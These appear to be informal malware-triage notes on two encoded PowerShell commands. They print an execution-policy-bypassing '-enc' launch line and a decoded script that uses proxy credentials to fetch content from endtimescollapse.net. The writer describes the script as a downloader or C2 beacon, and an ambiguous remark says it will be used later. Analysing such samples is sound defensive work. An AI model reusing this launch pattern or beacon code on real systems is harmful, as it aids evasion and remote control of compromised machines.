we found 2 enc starting with "-enc SW5" and  "-enc KCA"

this one need to be checked

C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc 

after decoding with AI chatgpt we have below


$proxyAddress = "https://endtimescollapse.net/"
$proxyPort = 8080
$proxyUsername = "provinceX"
$proxyPassword = "zoomaway"

$proxyCredential = New-Object System.Management.Automation.PSCredential(
    $proxyUsername,
    ($proxyPassword | ConvertTo-SecureString -AsPlainText -Force)
)

$proxyConfig = New-Object System.Net.WebProxy($proxyAddress, $proxyPort)
$proxyConfig.Credentials = $proxyCredential

$webRequest = [System.Net.WebRequest]::Create("https://endtimescollapse.net/")
$webRequest.Proxy = $proxyConfig

$response = $webRequest.GetResponse()
$reader = New-Object System.IO.StreamReader($response.GetResponseStream())
$responseText = $reader.ReadToEnd()

$reader.Close()
$response.Close()

Write-Output $responseText


This is not the persistence command itself. It is a downloader / C2 beacon:  we will use later for sure

Connects to https://endtimescollapse.net
Uses a configured proxy
Downloads content from the remote server
Reads and outputs the response

